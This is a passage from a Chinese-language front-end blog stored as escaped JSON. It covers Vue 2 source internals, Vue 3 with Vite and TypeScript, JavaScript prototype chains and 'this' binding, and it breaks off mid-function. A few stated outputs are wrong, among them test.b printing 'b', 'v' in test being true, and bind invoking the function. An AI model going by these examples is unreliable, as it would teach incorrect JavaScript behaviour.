if (compiled.tips &amp;&amp; compiled.tips.length) &#123; if (options.outputSourceRange) &#123; compiled.tips.forEach(function (e) &#123; return tip(e.msg, vm); &#125;); &#125; else &#123; compiled.tips.forEach(function (msg) &#123; return tip(msg, vm); &#125;); &#125; &#125; &#125; // turn code into functions var res = &#123;&#125;; var fnGenErrors = []; res.render = createFunction(compiled.render, fnGenErrors); res.staticRenderFns = compiled.staticRenderFns.map(function (code) &#123; return createFunction(code, fnGenErrors) &#125;); // check function generation errors. // this should only happen if there is a bug in the compiler itself. // mostly for codegen development use /* istanbul ignore if */ &#123; if ((!compiled.errors || !compiled.errors.length) &amp;&amp; fnGenErrors.length) &#123; warn$$1( &quot;Failed to generate render function:\\n\\n&quot; + fnGenErrors.map(function (ref) &#123; var err = ref.err; var code = ref.code; return ((err.toString()) + &quot; in\\n\\n&quot; + code + &quot;\\n&quot;); &#125;).join(&#x27;\\n&#x27;), vm ); &#125; &#125; return (cache[key] = res) &#125;&#125; 使用123456789var res = Vue.compile(&#x27;&lt;div&gt;&lt;span&gt;&#123;&#123; msg &#125;&#125;&lt;/span&gt;&lt;/div&gt;&#x27;)new Vue(&#123; data: &#123; msg: &#x27;hello&#x27; &#125;, render: res.render, staticRenderFns: res.staticRenderFns&#125;) Vue.observable(object)让一个对象可响应。Vue 内部会用它来处理 data 函数返回的对象 源码123456789101112131415161718192021function observe (value, asRootData) &#123; if (!isObject(value) || value instanceof VNode) &#123; return &#125; var ob; if (hasOwn(value, &#x27;__ob__&#x27;) &amp;&amp; value.__ob__ instanceof Observer) &#123; ob = value.__ob__; &#125; else if ( shouldObserve &amp;&amp; !isServerRendering() &amp;&amp; (Array.isArray(value) || isPlainObject(value)) &amp;&amp; Object.isExtensible(value) &amp;&amp; !value._isVue ) &#123; ob = new Observer(value); &#125; if (asRootData &amp;&amp; ob) &#123; ob.vmCount++; &#125; return ob &#125; 调用了 通過 new Observer() 在 Observer 内部通过 walk 方法 调用 defineReactive$$1 进行对象响应式处理 使用12345678const state = Vue.observable(&#123; count: 0 &#125;)const Demo = &#123; render(h) &#123; return h(&#x27;button&#x27;, &#123; on: &#123; click: () =&gt; &#123; state.count++ &#125;&#125; &#125;, `count is: $&#123;state.count&#125;`) &#125;&#125; Vue.version提供 Vue 的版本号 1Vue.version = &#x27;2.6.12&#x27;;","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"Vue3 + Vite + TypeScript 项目实战 -----（二）Vue3 生命周期","date":"2021-01-17T14:24:46.000Z","path":"2021/01/17/vue3-vite-typescript-02/","text":"Vue3 继承了 Vue2 的所有生命周期函数，所以 Vue2 的生命周期的应用方式同样适用于 Vue3。同时 Vue3 还新增了一些新的生命周期。 原有的生命周期函数我们这边不做过多的赘述，我们来讲解一下 Vue3 相对于 Vue2 变更了和新增了哪些生命周期函数 beforeUnmount unmounted 这两个生命周期替代了 Vue2 的 beforeDestory 和 destoryed生命周期，两者的作用是一致的，都是在组件卸载的时候调用的，在 Vue3 还可以使用 unmout API 来卸载应用 renderTracked 跟踪 虚拟DOM 渲染时候调用，接收 debugger event 作为参数组件第一次渲染的时候调用，数据发生改变不会调用 12345678910111213141516&lt;p&gt;Cart: &#123;&#123;cart&#125;&#125;&lt;/p&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; cart: 1 &#125; &#125;, // key: 渲染的属性的键名 // target: 渲染属性的键值对 // type: 对当前属性的操作 renderTracked(&#123;key, target, type&#125;) &#123; &#125; &#125;&lt;/script&gt; renderTriggered 当虚拟 DOM 重新渲染为 triggered.Similarly 为renderTracked，接收 debugger event 作为参数。此事件告诉你是什么操作触发了重新渲染，以及该操作的目标对象和键触发属性值的变更的时候触发 12345678910111213141516171819&lt;p&gt;Cart: &#123;&#123;cart&#125;&#125;&lt;/p&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; cart: 1 &#125; &#125;, // key: 渲染的属性的键名 // target: 渲染属性的键值对,值是修改之后的值 // type: 对当前属性的操作 renderTracked(&#123;key, target, type&#125;) &#123; &#125; mounted() &#123; setTimeout(() =&gt; &#123;this.cart++&#125;, 10000) &#125; &#125;&lt;/script&gt; 123456// 创建应用const app = createApp(&#123;&#125;)app.mount(&quot;#app&quot;)// 卸载应用app.unmount(&quot;#app&quot;) setup -&gt; created 和 beforeCreate setup 在 创建组件之前执行，作为组合式 API 的入口点,return 的返回值可以渲染到页面上 传参 props 父组件传入的 props 对象，是响应式的，prop 发生变化时会同时发生更新 注意不能使用结构赋值，否则会失去响应式的特性，如果想要解构出 props 中的属性可以选择使用 toRefs 来完成此操作 123456789101112131415161718192021222324252627282930313233343536&lt;template&gt; &lt;div&gt; &lt;!-- 记录 Vue3 生命周期的相关使用方法 --&gt; &lt;setup-hook :time=&quot;time&quot; other=&quot;other&quot; :other-time=&quot;time&quot; @success=&quot;handleSuccess&quot;&gt; &lt;span&gt; 23123&lt;/span&gt; &lt;template v-slot:title&gt; 23123&lt;/template&gt; &lt;template v-slot:bottom&gt; 23123&lt;/template&gt; &lt;/setup-hook&gt; &lt;div&gt;test text&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script lang=&quot;ts&quot;&gt;import components from &#x27;./components/index&#x27;export default &#123; components: &#123; ...components &#125;, data() &#123; return &#123; time: 1000 &#125; &#125;, mounted() &#123; setTimeout(() =&gt; &#123; this.time += 1000 &#125;, 1000) &#125;, methods: &#123; handleSuccess() &#123; console.log(&#x27;success&#x27;) &#125; &#125;,&#125;&lt;/script&gt; 12345678910111213141516171819&lt;div&gt; &lt;div&gt;当前时间：&#123;&#123;time&#125;&#125;&lt;/div&gt; &lt;div&gt;截取props&#123;&#123;newTime&#125;&#125;&lt;/div&gt; &lt;div&gt;toRefs(props)&#123;&#123;refTime&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script lang=&quot;ts&quot;&gt;import &#123;toRefs&#125; from &#x27;vue&#x27;export default &#123; setup(props) &#123; let &#123;time: newTime&#125; = props let &#123;time: refTime&#125; = toRefs(props) console.log(refTime) return &#123; newTime, refTime &#125; &#125;&#125;&lt;/script&gt; 使用 toRefs 解构 props 的时候 如果想要直接访问 需要访问其 value 属性，下面是打印出来的解构出来的值,最后需要使用 return 抛出需要渲染和使用的变量及方法 context 暴露了三个组件的 property (attrs, slots, emit) attrs 为父组件在子组件上传递的属性(未被props接收)slots 为父组件在子组件中传入的插槽 默认有一个 default 插槽emit 这是一个执行函数，相当于 Vue.$emit() 可以用于发送事件 context 是一个普通的 JavaScript 非响应式对象，可以安全的使用 ES6 的解构赋值操作 1234567891011121314151617181920&lt;!-- 父组件 --&gt;&lt;setup-hook :time=&quot;time&quot; other=&quot;other&quot; :other-time=&quot;time&quot; @success=&quot;handleSuccess&quot;&gt; &lt;span&gt; 23123&lt;/span&gt; &lt;template v-slot:title&gt; 23123&lt;/template&gt; &lt;template v-slot:bottom&gt; 23123&lt;/template&gt;&lt;/setup-hook&gt;&lt;!-- 子组件 --&gt;&lt;script&gt; setup(props, &#123;attrs, emit, slots&#125;) &#123; let &#123;time: newTime&#125; = props let &#123;time: refTime&#125; = toRefs(props) console.log(refTime) console.log(attrs, slots) emit(&#x27;success&#x27;) return &#123; newTime, refTime &#125; &#125;,&lt;/script&gt; 因此在执行 setup 的时候组件实例还未被创建，只能访问 props, attrs, slots, emit实例，无法访问 data, computed, methods setup 在最后会有一个返回值，这个返回值是包含我们需要渲染或者在其他生命周期需要使用的变量的对象。 我们在使用 setup 需要注意以下几点： setup 中的 this 并不是 Vue 实例的引用，因为 setup() 是在解析其它组件选项之前被调用的，所以 setup() 内部的 this 的行为与其它选项中的 this 完全不同。这在和其它选项式 API 一起使用 setup() 时可能会导致混淆。 如果在 setup 中，我们定义了一个引用类型的变量，并针对这个变量进行了延时修改，这时修改之后的值并不会改变页面渲染，因为我们定义的并不是一个响应式类型的数据，如果想要创建一个响应式类型的数据，可以使用 reactive 来创建 1let obj = reactive(&#123;value: 1, label: &#x27;object&#x27;&#125;) 如果我们定义的是一个基础类型的变量，此时也想要他实现响应式的一个变化，这是可以使用 ref 来创建，访问对象的值可以通过访问变量的 value 属性 1234const count = ref(0)console.log(count.value) // 0// 此外还可以对 ref 内部进行类型指定const count = ref&lt;string | number&gt;(0) setup 的返回值可以在其他生命周期或者函数中直接通过 this 调用，并且已进行过响应式处理 在 setup 中还新增了一下几种 生命周期钩子，这些钩子函数只能在 setup 中使用 onBeforeMountonMountedonBeforeUpdateonUpdatedonBeforeUnmountonUnmountonErrorCapturedonRenderTrackedonRenderTriggered 具体使用方法与生命周期函数类似，但是注意以上这些只能在 setup 中使用 12345setup() &#123; onMounted(() =&gt; &#123; console.log(&#x27;mounted&#x27;) &#125;)&#125; Vue3 还提供了 provide 和 inject 方便在 setup 中进行 提供和注入 1234567setup() &#123; provide(&#x27;title&#x27;, &#x27;this is a title&#x27;)&#125;setup() &#123; const title = inject(&#x27;title&#x27;, &#x27;default value&#x27;)&#125;","tags":[{"name":"Vue3","slug":"Vue3","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue3/"},{"name":"vite","slug":"vite","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/vite/"},{"name":"TypeScript","slug":"TypeScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/TypeScript/"}]},{"title":"Vue3 + Vite + TypeScript 项目实战 -----（一）搭建项目","date":"2021-01-15T14:56:10.000Z","path":"2021/01/15/vue3-vite-typescript-01/","text":"Vue3 新版出来了这么久，虽然之前也有联系过搭建，但是并没有测试过多的东西，趁着闲暇时间，打算从头采坑，记录自己的 Vue 3.0 的爬坑历程 搭建项目 本次项目搭建采用尤雨溪大大开发的 Vite，这是尤大最近开发出的新的 Web 开发工具具有以下优点 快速的冷启动 即时的模块热更新 真正的按需编译 使用 vite 极大的提高了前端的开发性能及开发速度 全局安装 Vite 123456789// 全局安装 vite-appnpm i -g vite-app// 创建项目npm init vite-app &lt;project-name&gt;cd project-nameyarn || npm install 安装 必要第三方插件 安装 TypeScript 1npm install -D typescript 根目录(src)下新增 shim.vue.d.ts 文件 123456789101112declare module &#x27;*.vue&#x27; &#123; import &#123; Component &#125; from &#x27;vue&#x27; const component: Component export default component&#125;// 或者declare module &#x27;*.vue&#x27; &#123; import Vue from &#x27;vue&#x27; // const component: defineComponent&lt;&#123;&#125;,&#123;&#125;,any&gt; export default Vue&#125; 修改 main.js 为 main.ts 并修改 index.html 文的引用 安装 vue-router vue3.0 最好安装最新的版的 vue-router，版本错误的话无法使用路由进行跳转 1npm install vue-router@4 然后在 src 目录下新建 router 目录，在目录下新建 index.ts 文件 从 vue-router 引入 createRouter 和 createWebHashHistory(或者createWebHistory) 1import &#123;createRouter, createWebHashHistory&#125; from &#x27;vue-router&#x27; 然后新建 一个 route对象，存放路由配置，使用 createRouter 方法 创建 router 对象，最后通过 export default 导出 1234567891011121314151617181920const routes = [ &#123; path: &#x27;/&#x27;, component: () =&gt; import(&#x27;../views/home/index.vue&#x27;), redirect: &#x27;/index&#x27;, children: [ &#123; path: &#x27;/login&#x27;, component: () =&gt; import(&#x27;../views/login/index.vue&#x27;) &#125;, ] &#125;,]var router = createRouter(&#123; history: createWebHashHistory(), routes&#125;)export default router 在 mian.ts 对象中 通过 import 引入，并用 Vue 的 use 方法 注册到 Vue 实例上 12import router from &#x27;./router&#x27;createApp(App).use(router).mount(&#x27;#app&#x27;) 使用 Vue 状态管理工具 Vuex 123456789101112131415161718192021222324// 安装npm install vuex@next// 使用// /src/store/index.tsimport Vuex from &#x27;vuex&#x27;const store = new Vuex.Store(&#123; // ... modules: &#123;&#125;, state: () =&gt; &#123; return &#123; name: &#x27;lxx&#x27; &#125; &#125;, mutations: &#123;&#125;, actions: &#123;&#125;, getters: &#123;&#125;&#125;)export default store// 注册import store from &#x27;./store&#x27;createApp(App).use(router).use(store).mount(&#x27;#app&#x27;) 使用 sass 语法 12345// 安装 sassyarn add sass// 安装完成之后 将 sass 从 dependencies 移动到 devDependencies// 使用时 在 style 后加 lang=&quot;scss&quot; 如果想要对 Vite 构建的 Vue3.0应用进行新的配置，首先需要在根目录创建一个 vite.config.js 文件 配置路径别名1234567891011const path = require(&quot;path&quot;)function resolve(dir) &#123; return path.join(__dirname, dir)&#125;module.export = &#123; alias: &#123; &#x27;/@/&#x27;: resolve(&#x27;src&#x27;) &#125;&#125; 此时访问 src 目录下的文件就可以通过 /@/来进行访问 12// 访问 src 目录下的 component 目录下的 index 文件import Component from &#x27;/@/component&#x27; 为什么要使用 /@/ 而不是直接 @/ 呢，在这里 Vite 的官方配置给我们做了解释 当别名为文件系统路径的时候，请使用绝对路径，相对别名值将按原样使用，并不会解析为文件路径，所有要使用 /@/ 来代表绝对路径","tags":[{"name":"Vue3","slug":"Vue3","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue3/"},{"name":"vite","slug":"vite","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/vite/"},{"name":"TypeScript","slug":"TypeScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/TypeScript/"}]},{"title":"JavaScript 原型链","date":"2021-01-14T14:57:43.000Z","path":"2021/01/14/js-prototype-chain/","text":"当我们定义了一个函数或者对象的时候，自带有属性中有一个属性 __proto__，这个属性又被称作原型链，指向构造当前函数的 prototype 1234567function Test() &#123; this.a = 1&#125;const test = new Test()console.log(test.__proto__) // &#123;constructor: f&#125;console.log(Test.prototype) // &#123;constructor: f&#125;console.log(test.__proto__ === Test.prototype) // true 当我们继续打印 Test.prototype.__proto__ 的时候会发现 Test 的构造函数是 Object，即 1console.log(Test.prototype.__proto__ === Object.prototype) // true 这个时候就会发现有些特殊的事情，当我们在 Test 的 prototype 属性上添加一些属性或者 Object 的 prototype 上添加一些属性，这时通过 new 构造出来的实例能不能访问到这些属性或者方法呢，接下来让我们尝试一下 12345678910111213141516171819202122 function Test() &#123; this.a = 1 &#125; const test = new Test() Test.prototype.b = 3 Object.prototype.c = 4 console.log(test.a) // 1 console.log(test.b) // 3 console.log(test.c) // 4~~~~这个时候如果我们在 test 实例上新增一个属性 b 并赋值，这时侯打印出来的 test.b 的值是多少呢~~~js function Test() &#123; this.a = 1 &#125; const test = new Test() Test.prototype.b = 3 Object.prototype.c = 4 test.b = 5 console.log(test.b) // b 这是因为 使用 new 构造函数的时候，会自动继承构造函数上的所有方法及属性，当我们在访问实例的某个属性的时候，会现在实例对象上查找是否包含有这个属性，如果包含就直接返回，不包含的话就会在实例的原型链 __proto__ 上继续查找，如果仍未找到，则会继续通过 __proto__一级一级的向上查找，直到找到 原型链的最后一级 Object,如果仍未找到就返回 undefined constructor 在实例的自身属性及 __proto__ 属性上有一个 contructor 属性，该属性指向 构造当前实例的 构造函数 1234567function Test() &#123; this.a = 1&#125;const test = new Test()// 这是因为 使用 new 构造函数的时候 把 Test 的所有属性都赋予了 testtest.__proto__.constructor // f Test() &#123;this.a = 1&#125;test.constructor // f Test() &#123;this.a = 1&#125; 判断是否包含属性 如何判断 实例的属性 是在实例自身身上还是在原型链上呢，这时候可以通过 Object.hasOwnProperty 123456789101112function Test() &#123; this.a = 1&#125;const test = new Test()Test.prototype.b = 3Object.prototype.c = 4console.log(test.hasOwnProperty(&#x27;a&#x27;)) // trueconsole.log(test.hasOwnProperty(&#x27;b&#x27;)) // falseconsole.log(test.hasOwnProperty(&#x27;c&#x27;)) // falseconsole.log(&#x27;a&#x27; in test) // trueconsole.log(&#x27;b&#x27; in test) // trueconsole.log(&#x27;v&#x27; in test) // true 属性 b 和 c 是挂载到 test 的原型链上的属性，并不属于 test 自身，所以通过 Object.hasOwnProperty 访问的时候返回为 false 特殊的原型 Object 和 Function 123Function.__proto__ === Function.prototype // trueObject.__proto__ === Function.prototype // trueObject.__proto__ === Function.__proto__ // true","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"prototype","slug":"prototype","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/prototype/"}]},{"title":"JavaScript - this 指向问题","date":"2021-01-11T01:30:46.000Z","path":"2021/01/11/js-this-point/","text":"this 的指向问题一直是 JavaScript 中一个很重要的问题，我们在日常编程中，经常会遇到在函数中执行的时候，发现从 this 中取不到我们想要的东西，面试的过程中，this 也是经常会被面试官问到的一个问题。 接下来，我们将会在此篇文章中详细的讲解一个 JavaScript 中 this 的获取及指向问题 this 指向在 JavaScript 中一个特殊的关键字 this，通过 this 我们可以获取当前代码块执行环境的对象 我们可以通过 this.xxx 来获取到 this 所代表的对象的属性 this 取何值，取决于 this 所处代码块为谁调用的 总结一下 this 指向几种情况 普通函数调用的时候，this 指向 window 又称作默认绑定 来看下面这一段代码 123456var name = &#x27;zhangsan&#x27;function fn() &#123; var name = &#x27;lisi&#x27; console.log(this.name)&#125;fn() 猜一下上述代码 输出的 name 是什么？ 对的，输出的 zhangsan，也许你会问为什么 函数 fn 里面的 this 不是指向函数 fn，这是因为在全局中通过 var 创建的变量也会默认挂载在 window 对象中， 调用 fn() 函数的时候，直接调用相当于 window.fn()，此时 this 指向调用函数 fn 的对象 即 window，所以输出的是 zhangsan。 需要注意一点的是，这段代码在浏览器执行和在 node 环境在执行输出的结果是不一样，因为在 node 环境中 全局对象是 global，而不是 window。 通过对象方法调用的时候，函数的 this 指向这个对象 又称作隐式绑定 我们对以上代码再次进行改装 12345678910var name = &#x27;zhangsan&#x27;var obj = &#123; name: &#x27;lisi&#x27;, fn: function() &#123; console.log(this.name) &#125;&#125;var fn = obj.fnobj.fn()fn() 上述代码输出的是什么呢？可能有会说输出的都是 lisi，因为函数 fn 位于 obj 对象里，所以它的 this 指向 obj，但是我们想说这是一种错误的理解方式，因为 this 的指向不是由他位于哪个代码块中决定，而是由它所在的代码块由谁调用来决定。 我们知道函数在执行之前都会经过解析，然后在栈内存中存放解析后的键值对，当解析到 obj 的时候，因为 obj 的类型是 Object 所以会在栈内存中开辟一个新的栈内存，用来存储 obj 的键值对，然后将新建的栈内存通过引用赋予 obj，当解析到 obj 的 fn 函数的时候，同样会开辟一个新的栈内存 AAAFFF000，这个栈内存用来存放 fn 的函数字符串 当我们通过 obj 来调用的时候，可以理解为 AAAFFF000 这个栈内存 上下文对象是 obj， 此时通过 this 调用的时候，this 指的就是 obj 这个对象 而将 obj.fn 赋值于 fn 的时候，由于 obj.fn 是一个引用对象，所以将 obj.fn 的引用地址复制给了 fn，然后调用 fn 相当于在 window 的环境下执行 AAAFFF000 这个代码块，此时的 this 指向 window 所以输出的是 12// &#x27;lisi&#x27;// &#x27;zhangsan&#x27; 接下来我们对这段代码进行进一步改造，然后看一下它的执行结果 12345678910111213var name = &#x27;zhangsan&#x27;var obj = &#123; name: &#x27;lisi&#x27;, fn: (function() &#123; console.log(this.name) return function() &#123; console.log(this.name) &#125; &#125;)()&#125;var fn = obj.fnobj.fn()fn() 你猜到这段代码输出的结果了吗？ 这段代码输出的结果是 123// &#x27;zhangsan&#x27;// &#x27;lisi&#x27;// zhangsan 大家看 obj 对象中的 fn 函数，这个函数是一个自执行函数，会在解析的时候就执行，这个时候上下文对象是 window，所以输出的是 ‘zhangsan’ 然后返回一个函数，此时这个 obj.fn 就等于这个 return 回来的函数 后面的输出的数据执行方法和上一个例子是一样的，这里就不在多做赘述 特殊的例子: 回调函数模式 123456789function foo() &#123; function test() &#123; console.log(this) &#125; return test&#125;foo()() // window// 因为 foo() 执行的相当于返回了 test 再一次调用和调用 test() 方法相等// foo()() === test() 特殊情况：参数赋值的情况 首先上代码 123456789101112var a = 3function foo() &#123; console.log(this)&#125;function bar(fn) &#123; fn()&#125;var obj = &#123; a: 2, foo: foo&#125;bar(obj.foo) // window 在 bar 函数中， fn 为形参，在调用 bar 函数传入 obj.foo 实参的时候，实际上相当于隐形的将 obj.foo 赋值于 fn，fn进行调用的时候，正好符合 this 的默认绑定规则，此时 this 指向 window 总结起来就一句话 函数每次执行的都会有自己的 this 指向，函数单独调用的时候(包括自调用函数)，this 执行 window，以对象的方法调用时候，this 隐式绑定为 该对象 显示绑定 call，bind，apply bind,call,apply都可以改变函数的 this 指向 1234567891011var obj = &#123; a: 1&#125;var a = 2function test() &#123; console.log(this.a)&#125;test() // 2test.call(obj) // 1test.bind(obj) // 1test.apply(obj) // 1 其中 call 和 apply 在改变 this 指向的时候会自动调用函数，而 bind 只会改变 this 指向并不会执行函数 call 和 bind 是可以传入多个参数 call(this, arg1, arg2, …), apply 多个参数需要放到数组里面 apply(this, [arg1, arg2, arg3…]) 通过构造函数 new 关键字创建的，this 指向实例对象 在通过 new 关键字构造函数时，主要做了以下四件事 首先创建了一个空对象 然后连接到原型，将 obj 的 __proto__ 指向构造函数的 prototype123class A &#123;&#125;var a = new A()a.__proto__ === A.prototype 通过 .call(obj) 将 function 的 this 指向 obj 返回创建的这个对象 123456function Fn() &#123; console.log(this) this.a = 1&#125;var fn = new Fn() // Fn&#123;&#125;console.log(fn.a) // 1 如果 Fn 函数 中 return 了一个对象 obj，new 的时候 this 会指向这个 obj对象 1234567function Fn() &#123; console.log(this) this.a = 1 return &#123;&#125;&#125;var fn = new Fn() // &#123;&#125;console.log(fn.a) // undefined 通常来说，优先级的顺序大概是 new &gt; call/bind/apply &gt; 隐式绑定 &gt; 默认绑定 12345678910111213141516var a = &#x27;window&#x27;function test() &#123; console.log(this.a)&#125;var obj = &#123; a: &#x27;obj’, test: test&#125;var obj2 = &#123; a: &#x27;obj2&#x27;&#125;test() // windowtest.call(obj) // objobj.test.call(obj2) // obj2new obj.test() // undefined this 指向 test&#123;&#125; 特殊的 this 指向es6 的箭头函数 先来看一下普通函数的 this 指向 123456789function b() &#123; function a()&#123; console.log(this) &#125; let c = function() &#123;a()&#125; let obj2 = &#123;a,c&#125; obj2.a()// &#123;a: fn(), c:fn()&#125; obj2.c()// window&#125;let obj = &#123;b&#125;obj.b()//使函数b内上下文this为obj 如果加上箭头函数 123456789function b() &#123; let a = () =&gt; console.log(this) let c = function() &#123;a()&#125; let obj2 = &#123;a,c&#125; obj2.a()//&#123;b: fn()&#125; obj2.c()//&#123;b: fn()&#125;&#125;let obj = &#123;b&#125;obj.b()//&#123;b:fn()&#125; 从上面的例子可以看出，箭头函数在调用的时候，指向声明的时候所在的上下文 也可以说 箭头函数 是没有 this，他的 this 全由所处上下文对象的 this 指向决定，一旦this 指向确定，无法通过 new/call/bind/apply/隐式绑定/显示绑定等方法修改this指向","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"this","slug":"this","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/this/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (一) - 全局配置","date":"2021-01-09T14:17:53.000Z","path":"2021/01/09/vue-learn-api-with-源码-01/","text":"此篇文章用来记录 Vue 中 Api 在 Vue源码中的具体实现方法，以便更好的理解 Vue 的各种 Api 的使用方法 全局配置Vue 的全局配置参数是存放在 config 里面的，我们可以通过修改 config 中的 properties 1234567891011121314151617181920212223Config = &#123; // user optionMergeStrategies: &#123; [key: string]: Function &#125;; silent: boolean; productionTip: boolean; performance: boolean; devtools: boolean; errorHandler: ?(err: Error, vm: Component, info: string) =&gt; void; warnHandler: ?(msg: string, vm: Component, trace: string) =&gt; void; ignoredElements: Array&lt;string | RegExp&gt;; keyCodes: &#123; [key: string]: number | Array&lt;number&gt; &#125;; // platform isReservedTag: (x?: string) =&gt; boolean; isReservedAttr: (x?: string) =&gt; boolean; parsePlatformTagName: (x: string) =&gt; string; isUnknownElement: (x?: string) =&gt; boolean; getTagNamespace: (x?: string) =&gt; string | void; mustUseProp: (tag: string, type: ?string, name: string) =&gt; boolean; // private async: boolean; // legacy _lifecycleHooks: Array&lt;string&gt;;&#125; 1. silent Boolean silent 配置 主要用于判断是否输出 Vue 所有的日志和警告 默认为 false 不取消日志和警告输出 设置为 true 取消日志和警告输出12345var hasConsole = typeof console !== &#x27;undefined&#x27;;// hasConsole 用于判断 window对象中 是否包含有 console 这个属性if (hasConsole &amp;&amp; (!config.silent)) &#123; console.error((&quot;[Vue warn]: &quot; + msg + trace));&#125; 2. optionMergeStrategies Object 自定义选项合并策略，覆盖已有值 主要用于 mixin 和 Vue.extend() 方法时对子组件和父组件 有相同属性时的合并策略 以下的 parentVal，parent 等父参数 只有 Vue.extend 或者 extends 传入对应类型数据时才有数据 Vue源码 自带的属性 el，propsData，provide 子组件和父组件如果有相同的方法，以子组件为主 el propsData12345678910111213141516var defaultStrat = function (parentVal, childVal) &#123; return childVal === undefined ? parentVal : childVal&#125;;strats.el = strats.propsData = function (parent, child, vm, key) &#123; if (!vm) &#123; warn( &quot;option \\&quot;&quot; + key + &quot;\\&quot; can only be used during instance &quot; + &#x27;creation with the `new` keyword.&#x27; ); &#125; // 在这里进行了判断，如果 child 存在 就返回 child 否则返回 parent // 表明在合并的过程中 el 和 propsData 以子的为准 return defaultStrat(parent, child)&#125;; provide strats.provide = mergeDataOrFn; data123456789101112131415161718function (parentVal, childVal, vm ) &#123; // childVal 是 组件的 data 函数 if (!vm) &#123; // 判断 vue 的 data 对象是一个函数 保证各个组件之间的数据互不影响 if (childVal &amp;&amp; typeof childVal !== &#x27;function&#x27;) &#123; warn( &#x27;The &quot;data&quot; option should be a function &#x27; + &#x27;that returns a per-instance value in component &#x27; + &#x27;definitions.&#x27;, vm ); // 如果子的值不是函数 返回父的值 return parentVal &#125; return mergeDataOrFn(parentVal, childVal) &#125; return mergeDataOrFn(parentVal, childVal, vm)&#125;; margeDataOrFn 方法1234567891011121314151617181920212223242526272829303132333435363738// 合并数据function mergeDataOrFn (parentVal, childVal, vm) &#123; if (!vm) &#123; // in a Vue.extend merge, both should be functions if (!childVal) &#123; return parentVal &#125; if (!parentVal) &#123; return childVal &#125; // when parentVal &amp; childVal are both present, // we need to return a function that returns the // merged result of both functions... no need to // check if parentVal is a function here because // it has to be a function to pass previous merges. return function mergedDataFn () &#123; return mergeData( typeof childVal === &#x27;function&#x27; ? childVal.call(this, this) : childVal, typeof parentVal === &#x27;function&#x27; ? parentVal.call(this, this) : parentVal ) &#125; &#125; else &#123; return function mergedInstanceDataFn () &#123; // instance merge var instanceData = typeof childVal === &#x27;function&#x27; ? childVal.call(vm, vm) : childVal; var defaultData = typeof parentVal === &#x27;function&#x27; ? parentVal.call(vm, vm) : parentVal; if (instanceData) &#123; return mergeData(instanceData, defaultData) &#125; else &#123; return defaultData &#125; &#125; &#125;&#125; margeData 方法set方法详解1234567891011121314151617181920212223242526272829function mergeData (to, from) &#123; if (!from) &#123; return to &#125; var key, toVal, fromVal; // 判断是否有 Symbol 数据类型，避免合并数据的时候遗漏 Symbol 类型属性 // Reflect.ownKeys(obj) 可以遍历出 Symbol 类型属性 // Object.keys,Object.values 无法遍历出 Symbol 类型属性 var keys = hasSymbol ? Reflect.ownKeys(from) : Object.keys(from); for (var i = 0; i &lt; keys.length; i++) &#123; key = keys[i]; // in case the object is already observed... if (key === &#x27;__ob__&#x27;) &#123; continue &#125; toVal = to[key]; fromVal = from[key]; if (!hasOwn(to, key)) &#123; set(to, key, fromVal); &#125; else if ( toVal !== fromVal &amp;&amp; isPlainObject(toVal) &amp;&amp; isPlainObject(fromVal) ) &#123; mergeData(toVal, fromVal); &#125; &#125; return to&#125; watch12345678910111213141516171819202122232425function (parentVal, childVal, vm, key) &#123; // work around Firefox&#x27;s Object.prototype.watch... if (parentVal === nativeWatch) &#123; parentVal = undefined; &#125; if (childVal === nativeWatch) &#123; childVal = undefined; &#125; /* istanbul ignore if */ if (!childVal) &#123; return Object.create(parentVal || null) &#125; &#123; assertObjectType(key, childVal, vm); &#125; if (!parentVal) &#123; return childVal &#125; var ret = &#123;&#125;; extend(ret, parentVal); for (var key$1 in childVal) &#123; var parent = ret[key$1]; var child = childVal[key$1]; if (parent &amp;&amp; !Array.isArray(parent)) &#123; parent = [parent]; &#125; // parent 存在 则和 child 合并，否则判断 child 是否是数组，返回 数组 ret[key$1] = parent ? parent.concat(child) : Array.isArray(child) ? child : [child]; &#125; return ret&#125;; hooks，watch 会把子组件和父组件相同的钩子函数合并到一个数组上，父组件的钩子函数先执行 声明周期函数(在此不一一列举了)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051var LIFECYCLE_HOOKS = [ &#x27;beforeCreate&#x27;, &#x27;created&#x27;, &#x27;beforeMount&#x27;, &#x27;mounted&#x27;, &#x27;beforeUpdate&#x27;, &#x27;updated&#x27;, &#x27;beforeDestroy&#x27;, &#x27;destroyed&#x27;, &#x27;activated&#x27;, &#x27;deactivated&#x27;, &#x27;errorCaptured&#x27;, &#x27;serverPrefetch&#x27;];LIFECYCLE_HOOKS.forEach(function (hook) &#123; strats[hook] = mergeHook;&#125;);// 使用方法function mergeHook (parentVal, childVal) &#123; /** * 下面这个三目表达式可以拆分成下列样式 * var test1 = Array.isArray(childVal) ? childVal : [childVal] * var test2 = parentVal ? parentVal.concat(childVal) : test1 * var test3 = childVal ? test2 : parentVal * 如果 childVal 存在，就执行 test2 语句 不存在 则取 parentVal * test2 语句中 如果 parentVal 存在， 则与 childVal 连接成一个新数组 否则执行 test1 语句 * test1 语句中 如果 childVal 是数组 就取 childVal 否则就转成数组 */ var res = childVal ? parentVal ? parentVal.concat(childVal) : Array.isArray(childVal) ? childVal : [childVal] : parentVal; // 对 获得的 res 进行去重 return res ? dedupeHooks(res) : res&#125;function dedupeHooks 